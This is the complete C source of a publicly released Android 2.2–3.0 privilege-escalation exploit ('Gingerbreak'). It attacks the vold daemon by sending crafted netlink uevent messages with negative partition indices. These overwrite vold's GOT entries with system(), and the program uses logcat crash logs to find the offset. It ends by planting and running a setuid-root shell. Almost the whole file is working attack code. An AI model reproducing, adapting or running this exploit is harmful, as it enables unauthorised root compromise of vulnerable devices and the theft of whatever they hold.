/* android 2.2-3.0 vold root exploit "mPartMinors[] (NPARTS) out of bounds write"
 * (checked for upper limit but not against negative values).
 *
 * Exploited by changing GOT entry of strcmp(),atoi() etc. to system()
 * and then triggering such call with provided pointer. :D
 * We nevermind NX protections and what they call ROP.
 *
 * (C) 2010-2011 The Android Exploid Crew
 *
 * Before using, insert empty formatted sdcard. USE IT AT YOUR OWN RISK, THIS PROGRAM
 * MIGHT NOT WORK OR MAKES YOUR DEVICE USELESS/BRICKED. SO BE WARNED!
 * I AM NOT RESPONSIBLE FOR ANY DAMAGE IT MIGHT CAUSE!
 *
 * It only works if called from adb shell since we need
 * group log.
 *
 */
#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/mount.h>
#include <sys/time.h>
#include <linux/netlink.h>
#include <sys/socket.h>
#include <sys/un.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <string.h>
#include <signal.h>
#include <stdlib.h>
#include <math.h>
#include <dlfcn.h>
#include <elf.h>
#include <sys/system_properties.h>


static struct {
	pid_t pid;
	uint32_t got_start, got_end;
	uint32_t system;
	char *device;
	char found;
} vold;


static pid_t logcat_pid = 77;
static char *sh = "/data/local/tmp/sh";
static char *bsh = "/data/local/tmp/boomsh";
static char *crashlog = "/data/local/tmp/crashlog";
static char *default_dev = "/devices/platform/msm_sdcc.2/mmc_host/mmc1";
static int scale = 1, honeycomb = 0, froyo = 0;

extern char **environ;


static void die(const char *msg)
{
	perror(msg);
	exit(errno);
}


static int copy(const char *from, const char *to)
{
	int fd1, fd2;
	char buf[0x1000];
	int r = 0;

	if ((fd1 = open(from, O_RDONLY)) < 0)
		return -1;
	if ((fd2 = open(to, O_RDWR|O_CREAT|O_TRUNC, 0600)) < 0) {
		close(fd1);
		return -1;
	}

	for (;;) {
		r = read(fd1, buf, sizeof(buf));
		if (r <= 0)
			break;
		if (write(fd2, buf, r) != r)
			break;
	}

	close(fd1);
	close(fd2);
	sync(); sync();
	return r;
}


static int remount_data(const char *mntpoint)
{
	FILE *f = NULL;
	int found = 0;
	char buf[1024], *dev = NULL, *fstype = NULL;

	if ((f = fopen("/proc/mounts", "r")) == NULL)
		return -1;

	memset(buf, 0, sizeof(buf));
	for (;!feof(f);) {
		if (fgets(buf, sizeof(buf), f) == NULL)
			break;
		if (strstr(buf, mntpoint)) {
			found = 1;
			break;
		}
	}
	fclose(f);
	if (!found)
		return -1;
	if ((dev = strtok(buf, " \t")) == NULL)
		return -1;
	if (strtok(NULL, " \t") == NULL)
		return -1;
	if ((fstype = strtok(NULL, " \t")) == NULL)
		return -1;
	return mount(dev, mntpoint, fstype, MS_REMOUNT, 0);
}


static void *find_symbol(char *sym)
{
	void *r = NULL;
	void *dlh = dlopen("/system/libc/libc.so", RTLD_NOW);

	if (!dlh)
		die("[-] dlopen");
	if ((r = (void *)dlsym(dlh, sym)) == NULL)
		die("[-] dlsym");
	dlclose(dlh);
	return r;
}


static void find_got(char *file)
{
	int fd, i;
	Elf32_Ehdr ehdr;
	Elf32_Phdr phdr;
	Elf32_Dyn *dyn = NULL;
	size_t dyn_size = 0;

	memset(&ehdr, 0, sizeof(ehdr));
	memset(&phdr, 0, sizeof(phdr));

	if ((fd = open(file, O_RDONLY)) < 0)
		die("[-] open");

	if (read(fd, &ehdr, sizeof(ehdr)) != sizeof(ehdr))
		die("[-] read");
	if (lseek(fd, ehdr.e_phoff, SEEK_SET) != ehdr.e_phoff)
		die("[-] lseek");

	for (i = 0; i < ehdr.e_phnum; ++i) {
		if (read(fd, &phdr, sizeof(phdr)) != sizeof(phdr))
			die("[-] read");
		if (phdr.p_type == PT_DYNAMIC)
			break;
	}
	if (phdr.p_type != PT_DYNAMIC)
		die("[-] No GOT found!");
	if (lseek(fd, phdr.p_offset, SEEK_SET) != phdr.p_offset)
		die("[-] lseek");
	dyn_size = phdr.p_filesz;
	printf("[+] Found PT_DYNAMIC of size %d (%d entries)\n", dyn_size,
	       dyn_size/sizeof(Elf32_Dyn));
	if ((dyn = malloc(dyn_size)) == NULL)
		die("[-] malloc");
	if (read(fd, dyn, dyn_size) != dyn_size)
		die("[-] read");
	close(fd);
	for (i = 0; i < dyn_size/sizeof(Elf32_Dyn); ++i) {
		if (dyn[i].d_tag == DT_PLTGOT)
			break;
	}
	if (dyn[i].d_tag != DT_PLTGOT)
		die("[-] No GOT found!");

	vold.got_start = dyn[i].d_un.d_ptr;
	free(dyn);

	/* Not really the end, but who cares, 64 entries should be enough
	 */
	vold.got_end = vold.got_start + scale*64;
	printf("[+] Found GOT: 0x%08x\n", vold.got_start);
}


static void find_device()
{
	char buf[1024], *dev = NULL, *sp = NULL;
	FILE *f;

	if ((f = fopen("/etc/vold.fstab", "r")) == NULL) {
		if ((f = fopen("/system/etc/vold.fstab", "r")) == NULL) {
			printf("[-] No vold.fstab found. Using default.\n");
			vold.device = strdup(default_dev);
			return;
		}
	}

	for (;!feof(f);) {
		memset(buf, 0, sizeof(buf));
		if (!fgets(buf, sizeof(buf), f))
			break;
		if (buf[0] == '#')
			continue;
		if (strstr(buf, "dev_mount") && (dev = strstr(buf, "/devices/")))
			break;
	}
	fclose(f);

	if (!dev) {
		printf("[-] No device found. Using default.\n");
		vold.device = strdup(default_dev);
	} else {
		if ((sp = strchr(dev, ' '))) {
			*sp = 0;
			vold.device = strdup(dev);
		} else if ((sp = strchr(dev, '\n'))) {
			*sp = 0;
			vold.device = strdup(dev);
		} else {
			printf("[-] No device found. Using default.\n");
			vold.device = strdup(default_dev);
		}
	}
	printf("[+] Using device %s\n", vold.device);
}


static void find_vold()
{
	char buf[2048], *ptr = NULL;
	int i = 0, fd;
	pid_t found = 0;
	FILE *f = NULL;

	vold.found = 0;

	if ((f = fopen("/proc/net/netlink", "r")) == NULL)
		die("[-] fopen");

	for (;!feof(f);) {
		memset(buf, 0, sizeof(buf));
		if (!fgets(buf, sizeof(buf), f))
			break;
		if ((ptr = strtok(buf, "\t ")) == NULL)
			break;
		if ((ptr = strtok(NULL, "\t ")) == NULL)
			break;
		if ((ptr = strtok(NULL, "\t ")) == NULL)
			break;
		if (!*ptr)
			break;
		i = atoi(ptr);
		if (i <= 1)
			continue;
		sprintf(buf, "/proc/%d/cmdline", i);
		if ((fd = open(buf, O_RDONLY)) < 0)
			continue;
		memset(buf, 0, sizeof(buf));
		read(fd, buf, sizeof(buf) - 1);
		close(fd);
		if (strstr(buf, "/system/bin/vold")) {
			found = i;
			break;
		}
        }
	fclose(f);
	if (!found)
		return;

	printf("Vold pid: %d\n", found);
	vold.pid = found;
	vold.found = 1;

	/* If already called no need to look for the mappings again as
	 * they wont change
	 */
	if (vold.system)
		return;

	ptr = find_symbol("system");
	vold.system = (uint32_t)ptr;
	printf("[+] Found system: %p strcmp: %p\n", ptr, find_symbol("strcmp"));
        return;
}


/* Needed to make it work on 2.2 too
 */
static int last_try()
{
	char buf[0x1000];
	struct sockaddr_nl snl;
	struct iovec iov = {buf, sizeof(buf)};
	struct msghdr msg = {&snl, sizeof(snl), &iov, 1, NULL, 0, 0};
	int sock = -1, n = 0;

	do {
		find_vold();
		usleep(10000);
	} while (!vold.found);

	memset(buf, 0, sizeof(buf));
	memset(&snl, 0, sizeof(snl));
	snl.nl_family = AF_NETLINK;

	if ((sock = socket(PF_NETLINK, SOCK_DGRAM, NETLINK_KOBJECT_UEVENT)) < 0)
		die("[-] socket");
	snl.nl_pid = vold.pid;

	memset(buf, 0, sizeof(buf));

	n = snprintf(buf, sizeof(buf), "@/foo%cACTION=add%cSUBSYSTEM=block%c"
	                  "DEVPATH=%s%c"
               	          "MAJOR=179%cMINOR=%d%cDEVTYPE=harder%cPARTN=1",
                       	  0, 0, 0, bsh, 0, 0, vold.system, 0, 0);
	msg.msg_iov->iov_len = n;
	n = sendmsg(sock, &msg, 0);
	sleep(3);
	close(sock);
	return 0;
}



static int do_fault(uint32_t idx, int oneshot)
{
	char buf[0x1000];
	struct sockaddr_nl snl;
	struct iovec iov = {buf, sizeof(buf)};
	struct msghdr msg = {&snl, sizeof(snl), &iov, 1, NULL, 0, 0};
	int sock = -1, n = 0;

	do {
		find_vold();
		usleep(10000);
	} while (!vold.found);

	usleep(200000);
	memset(buf, 0, sizeof(buf));
	memset(&snl, 0, sizeof(snl));
	snl.nl_family = AF_NETLINK;

	if ((sock = socket(PF_NETLINK, SOCK_DGRAM, NETLINK_KOBJECT_UEVENT)) < 0)
		die("[-] socket");
	snl.nl_pid = vold.pid;

	memset(buf, 0, sizeof(buf));
	n = snprintf(buf, sizeof(buf), "@/foo%cACTION=add%cSUBSYSTEM=block%c"
	                  "DEVPATH=%s%c"
                          "MAJOR=179%cMINOR=%d%cDEVTYPE=harder%cPARTN=%d",
                          0, 0, 0, vold.device, 0, 0, vold.system, 0, 0, -idx);
	msg.msg_iov->iov_len = n;

	n = sendmsg(sock, &msg, 0);
	if (n < 0 || oneshot) {
		close(sock);
		return n;
	}

	printf("written %d\n", n); 
	usleep(500000);

	/* Trigger any of the GOT overwriten strcmp(), atoi(), strdup() etc.
	 * inside vold main binary.
	 * Arent we smart? Using old school technique from '99 to fsck NX while others
	 * re-invent "ROP". Wuhahahahaha!!!
	 */
	if (honeycomb) {
		n = snprintf(buf, sizeof(buf), "@/foo%cACTION=add%cSUBSYSTEM=block%c"
		                  "SEQNUM=%s%cDEVPATH=%s%c"
                	          "MAJOR=%s%cMINOR=%s%cDEVTYPE=%s%cPARTN=1",
                        	  0, 0, 0, bsh, 0, bsh, 0, bsh, 0, bsh, 0, bsh, 0);
	} else if (froyo) {
		n = snprintf(buf, sizeof(buf), "@/foo%cACTION=add%cSUBSYSTEM=block%c"
		                  "DEVPATH=%s%c"
                	          "MAJOR=179%cMINOR=%d%cDEVTYPE=harder%cPARTN=1",
                        	  0, 0, 0, bsh, 0, 0, vold.system, 0, 0);
	} else {
		n = snprintf(buf, sizeof(buf), "%s;@%s%cACTION=%s%cSUBSYSTEM=%s%c"
		                  "SEQNUM=%s%cDEVPATH=%s%c"
                	          "MAJOR=179%cMINOR=%d%cDEVTYPE=harder%cPARTN=1",
                        	  bsh, bsh, 0, bsh, 0, bsh, 0, bsh, 0, bsh, 0, 0, vold.system, 0, 0);
	}

	msg.msg_iov->iov_len = n;
	n = sendmsg(sock, &msg, 0);
	printf("written %d\n", n); 

	close(sock);

	return n;
}


static uint32_t find_index()
{
	uint32_t min = 0, max = vold.got_start, fault_addr = 0, idx = 0;
	char buf[1024], *ptr = NULL;
	FILE *f = NULL;
	long pos = 0;

	system("/system/bin/logcat -c");
	unlink(crashlog);

	if ((logcat_pid = fork()) == 0) {
		char *a[] = {"/system/bin/logcat",  "-f", crashlog, NULL};
		execve(*a, a, environ);
		exit(1);
	}

	sleep(3);

	idx = scale*0x1000/4;
	for (;;) {
		if (do_fault(idx, 1) < 0)
			continue;
		/* Give logcat time to write to file
		 */
		sleep(3);
		if ((f = fopen(crashlog, "r")) == NULL)
			die("[-] Unable to open crashlog file");
		fseek(f, pos, SEEK_SET);
		do {
			memset(buf, 0, sizeof(buf));
			if (!fgets(buf, sizeof(buf), f))
				break;
			if ((ptr = strstr(buf, "fault addr ")) != NULL) {
				ptr += 11;
				fault_addr = (uint32_t)strtoul(ptr, NULL, 16);
				printf("[*] vold: %04d idx: %d fault addr: 0x%08x\n", vold.pid, -idx, fault_addr);
			}
		} while (!feof(f));
		pos = ftell(f);
		fclose(f);

		if (fault_addr > min && fault_addr < max) {
			printf("[+] fault address in range (0x%08x,idx=%d)\n", fault_addr, -idx);
			break;
		}
		idx += 0x1000/4;
	}

	// Honeycomb needs scaling by 10
	idx = (fault_addr + 4*idx - vold.got_start)/4;
	if (scale > 1)
		idx = scale*(fault_addr + 4*idx/scale - vold.got_start)/4;

	printf("[+] Calculated idx: %d\n", -idx);
	return idx;
}


static void do_root()
{
	remount_data("/data");
	chown(sh, 0, 0);
	chmod(sh, 04711);
	exit(0);
}


int main(int argc, char **argv, char **env)
{
	uint32_t i = 0, j = 0, idx = 0;
	char *ash[] = {sh, 0};
	struct stat st;
	char build_id[256], version_release[256];

	if (geteuid() == 0 && getuid() == 0 && strstr(argv[0], "boomsh"))
		do_root();

	printf("\n[**] Gingerbreak/Honeybomb -- android 2.[2,3], 3.0 softbreak\n");
	printf("[**] (C) 2010-2011 The Android Exploid Crew. All rights reserved.\n");
	printf("[**] Kudos to jenzi, the #brownpants-party, the Open Source folks,\n");
	printf("[**] Zynamics for ARM skills and Onkel Budi\n\n");
	printf("[**] donate to 7-4-3-C@web.de if you like\n[**] Exploit may take a while!\n\n");

	if (copy("/proc/self/exe", bsh) < 0 || copy("/system/bin/sh", sh) < 0)
		die("[-] Cannot copy boomsh.");

	chmod(bsh, 0711);

	__system_property_get("ro.build.id", build_id);
	__system_property_get("ro.build.version.release", version_release);

	if (strstr(build_id, "HONEY") || strstr(build_id, "Honey") || strstr(build_id, "honey") ||
	    strstr(version_release, "comb")) {
		printf("[+] Detected honeycomb! Starting honeybomb mode (scale=10).\n");
		scale = 10;
		honeycomb = 1;
	} else if (strstr(build_id, "FR") || strstr(build_id, "Fr") || strstr(build_id, "fr")) {
		printf("[+] Detected Froyo!\n");
		froyo = 1;
	} else
		printf("[+] Plain Gingerbread mode!\n");

	find_vold(&vold);
	find_got("/system/bin/vold");
	find_device();

	printf("[*] vold: %04d GOT start: 0x%08x GOT end: 0x%08x\n", vold.pid, vold.got_start,
	       vold.got_end);
	idx = find_index();

	kill(logcat_pid, SIGKILL);
	unlink(crashlog);

	for (i = idx; j++ < (vold.got_end - vold.got_start); --i) {
		if (do_fault(i, 0) < 0) {
			++i; --j;
			printf("[-] sendmsg() failed?\n");
			continue;
		}
		printf("[*] vold: %04d idx: %08d\n", vold.pid, -i); fflush(stdout);
		stat(sh, &st);
		if ((st.st_mode & 04000) == 04000) {
			printf("\n\n[!] dance forever my only one\n");
			break;
		}
	}

	/* Last try, sometimes vold cant handle 2 receives in the order
	 * we like by do_fault()
	 */
	if ((st.st_mode & 04000) != 04000) {
		last_try(); last_try();
		stat(sh, &st);
		if ((st.st_mode & 04000) == 04000) {
			printf("\n[+] You are in luck! Last try succeeded!\n");
		} else {
			printf("\n[-] Bad luck. Fixed vold?\n");
			exit(1);
		}
	}

	execve(*ash, ash, env);
	return 0;
}

